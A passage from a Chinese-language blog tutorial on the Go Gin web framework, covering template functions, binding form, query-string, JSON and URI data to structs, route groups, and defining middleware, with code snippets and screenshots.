src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403996.png" alt="image-20230405105323556"></p><h2 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>print</td><td>打印字符串</td></tr><tr><td>printf</td><td>按照格式化的字符串输出</td></tr><tr><td>len</td><td>返回对应类型的长度(map, slice, array, string, chan)</td></tr><tr><td>管道符 |</td><td>函数中使用管道传递过来的数值</td></tr><tr><td>括号 ()</td><td>提高优先级别</td></tr><tr><td>and</td><td>只要有一个为空，则整体为空；如果都不为空，则返回最后一个</td></tr><tr><td>or</td><td>只要有一个不为空，则返回第一个不为空的；如果都是空，则返回空</td></tr><tr><td>not</td><td>有值则返回false，没有值则返回true</td></tr><tr><td>index</td><td>读取指定类型对应下标的值(map, slice, array, string)</td></tr><tr><td>eq</td><td>等于equal，返回布尔值</td></tr><tr><td>ne</td><td>不等于 not equal，返回布尔值</td></tr><tr><td>lt</td><td>小于 less than，返回布尔值</td></tr><tr><td>le</td><td>小于等于less equal，返回布尔值</td></tr><tr><td>gt</td><td>大于 greater than，返回布尔值</td></tr><tr><td>ge</td><td>大于等于 greater equal，返回布尔值</td></tr><tr><td>Format</td><td>日期格式化</td></tr></tbody></table><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;My name is fuming .&quot;</span>&#125;&#125;<br>&#123;&#123;printf <span class="hljs-string">&quot;My name is %s . &quot;</span> <span class="hljs-string">&quot;fuming&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403018.png" alt="image-20230405123230997"></p><h3 id="len"><a href="#len" class="headerlink" title="len"></a>len</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-built_in">len</span> <span class="hljs-string">&quot;My name is fuming .&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403218.png" alt="image-20230405123309619"></p><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-string">&quot;My name is fuming .&quot;</span> | <span class="hljs-built_in">print</span>&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&quot;My name is fuming .&quot;</span> | <span class="hljs-built_in">len</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403289.png" alt="image-20230405123407826"></p><h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 优先将 &quot;fu&quot; &quot;ming&quot; 2个字符串组合，再做参数传递</span><br>&#123;&#123;printf <span class="hljs-string">&quot;My name is %s .&quot;</span> (printf <span class="hljs-string">&quot;%s%s&quot;</span> <span class="hljs-string">&quot;fu&quot;</span> <span class="hljs-string">&quot;ming&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403785.png" alt="image-20230405124144243"></p><h3 id="and"><a href="#and" class="headerlink" title="and"></a>and</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-comment">/* and */</span>&#125;&#125;<br>&#123;&#123;and .a .b&#125;&#125;&lt;br&gt;<br>&#123;&#123;<span class="hljs-comment">/* or */</span>&#125;&#125;<br>&#123;&#123;or .a .b&#125;&#125;&lt;br&gt;<br>&#123;&#123;<span class="hljs-comment">/* not */</span>&#125;&#125;<br>&#123;&#123;not .a&#125;&#125;&lt;br&gt;<br>&#123;&#123;not .b&#125;&#125;&lt;br&gt;<br>&#123;&#123;not .c&#125;&#125;&lt;br&gt;<br>&#123;&#123;<span class="hljs-comment">/* index */</span>&#125;&#125;<br>&#123;&#123;index .b.Hobbys <span class="hljs-number">0</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403924.png" alt="image-20230405125818941"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403312.png" alt="image-20230405125911863"></p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;eq <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;ne <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;lt <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;le <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;gt <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;ge <span class="hljs-number">26</span> <span class="hljs-number">89</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403448.png" alt="image-20230405130238404"></p><h3 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;.Format <span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;.Format <span class="hljs-string">&quot;2006-01-02&quot;</span>&#125;&#125;&lt;br&gt;<br>&#123;&#123;.Format <span class="hljs-string">&quot;15:04:05&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404476.png" alt="image-20230405130705958"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404017.png" alt="image-20230405130714299"></p><h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><p>在模板文件中使用后端自定义的函数：</p><ol><li>后端定义函数</li><li>后端注册函数（ 加载目标文件之前 ）</li><li>前端使用函数</li></ol><p>后端定义函数：</p><p>myfunc包下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Add</span><span class="hljs-params">(a, b, c <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> a + b + c<br>&#125;<br></code></pre></td></tr></table></figure><p>后端注册函数（ 加载目标文件之前 ）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.SetFuncMap(template.FuncMap&#123;<br><span class="hljs-comment">// 键值对 ( 前端函数名:对应后端函数名 )</span><br><span class="hljs-string">&quot;AddThree&quot;</span>: myfunc.Add,<br>&#125;)<br>    <span class="hljs-comment">// 加载目标文件</span><br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;static&quot;</span>)<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, myfunc.Index)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p>前端使用函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;AddThree <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404530.png" alt="image-20230405131856022"></p><h2 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h2><p>基于请求自动提取JSON、form表单和QueryString类型的数据，并把值绑定到后端指定的结构体对象中去</p><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>前端：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404540.png" alt="image-20230405150714325"></p><p>后端路由：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404445.png" alt="image-20230405150733434"></p><p>myfunc.Post：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> user <span class="hljs-keyword">struct</span> &#123;<br>Uname  <span class="hljs-type">string</span> <span class="hljs-string">`form:&quot;username&quot;`</span><br>Passwd <span class="hljs-type">string</span> <span class="hljs-string">`form:&quot;password&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Post</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> u user<br>err := context.ShouldBind(&amp;u)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;绑定失败&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;%v&quot;</span>, u)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404739.png" alt="image-20230405150835741"></p><h3 id="路径querystring"><a href="#路径querystring" class="headerlink" title="路径querystring"></a>路径querystring</h3><p>页面以get方式请求数据，WEB SERVER将请求数据放入名为 QUERY_STRING的环境变量中，所以可以称作为querystring类型的绑定。</p><p><a href="http://43.139.185.135:8080/get?username=fuming&password=123456">http://43.139.185.135:8080/get?username=fuming&amp;password=123456</a></p><p>路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/get&quot;</span>, myfunc.Get)<br></code></pre></td></tr></table></figure><p>myfunc.Get</p><p>和<code>form</code>表单的一模一样：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404182.png" alt="image-20230405151631782"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404152.png" alt="image-20230405151650972"></p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>前端使用<code>ajax</code>将JSON数据传递给后端。</p><p>前端：</p><ul><li>contentType:”application&#x2F;json”</li><li>JSON.stringify</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> sub = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;submit&quot;</span>);</span><br><span class="language-javascript">  sub.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> uname = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> passwd = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">      <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;/post&quot;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">type</span>:<span class="hljs-string">&quot;post&quot;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">contentType</span>:<span class="hljs-string">&quot;application/json&quot;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">data</span>:<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-string">&quot;uname&quot;</span>:uname,</span><br><span class="language-javascript">        <span class="hljs-string">&quot;passwd&quot;</span>:passwd</span><br><span class="language-javascript">      &#125;),</span><br><span class="language-javascript">      <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">info</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(info[<span class="hljs-string">&quot;msg&quot;</span>]);</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">  &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404047.png" alt="image-20230405152948190"></p><p>路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, myfunc.Index)<br>r.POST(<span class="hljs-string">&quot;/post&quot;</span>, myfunc.Post)<br></code></pre></td></tr></table></figure><p>后端接收JSON绑定到结构体即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> user <span class="hljs-keyword">struct</span> &#123;<br>Uname  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;uname&quot;`</span><br>Passwd <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;passwd&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Post</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> u user<br>err := context.ShouldBind(&amp;u)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.JSON(<span class="hljs-number">404</span>, gin.H&#123;<br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;绑定失败&quot;</span>,<br>&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;登录成功&quot;</span>,<br>&#125;)<br>fmt.Println(u)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URI：统一资源标识符 a&#x2F;login  </p><p>URL：统一资源定位符 <a href="http://localhost:8080/a/login">http://localhost:8080/a/login</a>  </p><p>路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 路由格式相同,优先走有路由的路线 -&gt; /admin/123456 走 myfunc.Index</span><br>r.GET(<span class="hljs-string">&quot;/uri/:username/:password&quot;</span>, myfunc.Uri)<br>r.GET(<span class="hljs-string">&quot;/uri/admin/123456&quot;</span>, myfunc.Index)<br></code></pre></td></tr></table></figure><p>myfunc.Uri</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> user <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 添加 uri </span><br>Uname  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;uname&quot; uri:&quot;username&quot;`</span><br>Passwd <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;passwd&quot; uri:&quot;password&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Uri</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> u user<br>    <span class="hljs-comment">// 绑定uri</span><br>err := context.ShouldBindUri(&amp;u)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;绑定失败&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.String(<span class="hljs-number">202</span>, <span class="hljs-string">&quot;Uname=%s\nPasswd=%s&quot;</span>, u.Uname, u.Passwd)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> ShouldBindUri(obj any) <span class="hljs-type">error</span><br></code></pre></td></tr></table></figure><p><a href="http://43.139.185.135:8080/uri/fuming/123456">http://43.139.185.135:8080/uri/fuming/123456</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404257.png" alt="image-20230405154559987"></p><p><a href="http://43.139.185.135:8080/uri/admin/123456">http://43.139.185.135:8080/uri/admin/123456</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404800.png" alt="image-20230405154632231"></p><h2 id="路由组"><a href="#路由组" class="headerlink" title="路由组"></a>路由组</h2><p>路由组：将不同的路由按照版本、模块进行不同的分组，利于维护，方便管理。</p><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(group *RouterGroup)</span></span> Group(relativePath <span class="hljs-type">string</span>, handlers ...HandlerFunc) *RouterGroup<br></code></pre></td></tr></table></figure><p>使用<code>Group</code>方法进行分组，<code>&#123;&#125;</code> 定义组成员。</p><p><code>&#123;&#125;</code> 的作用就是将同一组的路由包裹起来。</p><p>如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">general := r.Group(<span class="hljs-string">&quot;/general&quot;</span>)<br>&#123;<br>    general.GET(<span class="hljs-string">&quot;/index&quot;</span>,func1)<br>    general.GET(<span class="hljs-string">&quot;/login&quot;</span>)<br>    general.GET(<span class="hljs-string">&quot;/backstage&quot;</span>)<br>&#125;<br>member := r.Group(<span class="hljs-string">&quot;/member&quot;</span>)<br>&#123;<br>    member.GET(<span class="hljs-string">&quot;/index&quot;</span>)<br>    member.GET(<span class="hljs-string">&quot;/login&quot;</span>)<br>    member.GET(<span class="hljs-string">&quot;/backstage&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>定义路由组后，想要执行 func1 ，就需要请求 <code>/general/index</code> 这个路由。</p><h3 id="抽取"><a href="#抽取" class="headerlink" title="抽取"></a>抽取</h3><ul><li>总路由中设置路由组（总路由）</li><li>模块中的路由负责映射具体的业务（模块路由：模块路由接收总路由中的某个组，对组进行具体的路由设置）</li></ul><p>总路由中设置路由组：</p><p><code>router/router.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> router<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Router</span><span class="hljs-params">(r *gin.Engine)</span></span> &#123;<br><span class="hljs-comment">// 定义分组</span><br>g := r.Group(<span class="hljs-string">&quot;/general&quot;</span>)<br>m := r.Group(<span class="hljs-string">&quot;/member&quot;</span>)<br><span class="hljs-comment">// 将组传递给对应模块路由</span><br>general.Router(g)<br>member.Router(m)<br>&#125;<br></code></pre></td></tr></table></figure><p>主函数中调用总路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;/static&quot;</span>)<br>router.Router(r)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p>模块路由中：接收组路由，然后对其组内具体路由进行设置</p><p><code>general/router.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Router 接收一个分组路由</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Router</span><span class="hljs-params">(g *gin.RouterGroup)</span></span> &#123;<br>g.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>index</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.HTML(http.StatusOK, <span class="hljs-string">&quot;general/index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>member/router.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Router</span><span class="hljs-params">(m *gin.RouterGroup)</span></span> &#123;<br>m.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>index</code> 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.HTML(http.StatusOK, <span class="hljs-string">&quot;member/index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>结构：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404050.png" alt="image-20230405163231519"></p><p><a href="http://43.139.185.135:8080/general/">http://43.139.185.135:8080/general/</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404016.png" alt="image-20230405163244775"></p><p><a href="http://43.139.185.135:8080/member/">http://43.139.185.135:8080/member/</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051404171.png" alt="image-20230405163306383"></p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Gin框架允许开发者在处理请求的过程中，加入用户自己的钩子(Hook)函数(中间件函数)，这个钩子函数就叫中间件。</p><ul><li>普通函数：针对某个路由的请求</li><li>钩子函数：针对部分、所有请求都生效的函数</li></ul><p>中间件适合处理一些公共的业务逻辑，比如登录认证、权限校验、数据分页、记录日志、耗时统计等等。<br>比如：在访问登录后的所有页面，都必须进行登录判断，而对于每个路由函数都写一个登录判断功能自然不太可能，这时候就用到了钩子函数。定义一个钩子函数，处理登录后的所有请求。</p><p>函数 -&gt; 重复功能的代码块</p><p>钩子函数 -&gt; 重复使用的函数</p><p><code>gin.default</code>实例化引擎，默认有两中间件 <code>Logger</code> 和 <code>Recovery</code> 分别处理日志和错误。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>直接定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">OneMiddle</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// 这里是公用的逻辑代码</span><br>fmt.Println(<span class="hljs-string">&quot;OneMiddle&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>间接定义：</p><p>定义一个函数，其返回值为一个<code>context *gin.Engine</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TwoMiddle</span><span class="hljs-params">()</span></span> gin.HandlerFunc&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(context *gin.Context)</span></span>&#123;<br>fmt.Println(<span 